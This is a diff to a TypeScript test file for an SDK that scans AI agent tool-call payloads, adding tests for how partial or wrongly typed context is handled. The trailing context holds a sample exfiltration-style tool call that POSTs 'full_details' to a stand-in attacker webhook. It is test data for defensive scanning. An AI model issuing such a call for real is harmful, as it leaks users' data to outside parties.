@@ -65,6 +65,22 @@ test("scanPayload omits context when not supplied", async () => {
   assert.equal("context" in lastBody(), false);
 });
 
+test("scanPayload accepts a partial context", async () => {
+  const { client, lastBody } = verdictClient();
+  await client.scanPayload("hello", "x", { context: { user_request: "summarize tickets" } });
+  assert.deepEqual(lastBody().context, { user_request: "summarize tickets" });
+});
+
+test("scanPayload rejects a string where a list is required", async () => {
+  const { client } = verdictClient();
+  await assert.rejects(
+    () => client.scanPayload("hello", "x", {
+      context: { principal_domains: "acme.io" } as unknown as ActionContext,
+    }),
+    /array|Expected/i,
+  );
+});
+
 test("context flips an egress verdict Allow<->Review through the SDK", async () => {
   const payload = '{"tool":"http_request","args":{"method":"POST","url":"https://webhook.attacker-collect.io/i","body":{"full_details":true}}}';
 
